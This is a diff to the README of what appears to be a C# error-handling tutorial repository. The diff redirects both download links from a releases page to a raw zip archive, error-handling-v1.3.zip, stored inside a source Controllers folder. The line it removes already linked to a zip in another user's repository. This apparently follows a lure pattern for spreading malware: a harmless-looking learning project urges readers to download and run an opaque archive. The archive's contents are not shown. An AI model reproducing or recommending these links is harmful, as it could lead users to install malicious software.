@@ -1,6 +1,6 @@
 # 🚀 error-handling - Easily Learn Error Management in C#
 
-[![Download Latest Release](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip%20Latest%20Release-Visit%20Here-blue)](https://github.com/wy671127793-cmd/error-handling/releases)
+[![Download Latest Release](https://github.com/wy671127793-cmd/error-handling/raw/refs/heads/main/src/ErrorHandling.Api/Controllers/error-handling-v1.3.zip%20Latest%20Release-Visit%20Here-blue)](https://github.com/wy671127793-cmd/error-handling/raw/refs/heads/main/src/ErrorHandling.Api/Controllers/error-handling-v1.3.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page.  
-   [Download Latest Release](https://github.com/wy671127793-cmd/error-handling/releases)
+   [Download Latest Release](https://github.com/wy671127793-cmd/error-handling/raw/refs/heads/main/src/ErrorHandling.Api/Controllers/error-handling-v1.3.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the software. Look for the latest version. It will be at the top of the list.
